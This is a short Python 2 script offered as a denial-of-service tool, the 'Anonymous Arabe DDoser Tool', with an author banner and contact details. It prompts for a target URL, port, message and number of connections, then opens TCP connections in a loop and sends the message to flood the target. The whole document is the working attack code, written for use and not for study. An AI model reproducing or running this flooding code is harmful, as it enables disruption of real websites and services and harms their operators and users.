


 
import time
import socket
import os
import sys
import string
 

print("##########################################")
print("[*] Coded By S1L3N7")
print("[*] Contact Email : mraidi.amzar@gmail.com")
print("[*] INSTAGRAM: @Silent_anons [other is fake]")
print("[*] thanks to Mr.HTTP")
print("#########################################")
 
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 

print("Welcome To Anonymous Arabe DDoser Tool !")
raw_input("Press Enter To Continue")
print ("DDos mode loaded")

host=raw_input( "URL : " )
port=input( "Port you want to attack Default is 80: " )
message=raw_input( "Input the message you want to send: " )
conn=input( "How many connections do you want to make: " )
ip = socket.gethostbyname( host )

print ( "[Ip is %s]" ) %(ip)
print ( "[Attacking " + host + "]" )
print ("#######################")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("#[Connection Failed]         #")
    print ( "#[ Attacking !]       #")
    ddos.close()
for i in range(1, conn):
    dos()
print ("#######################")
print("The Connections you requested had finished !")
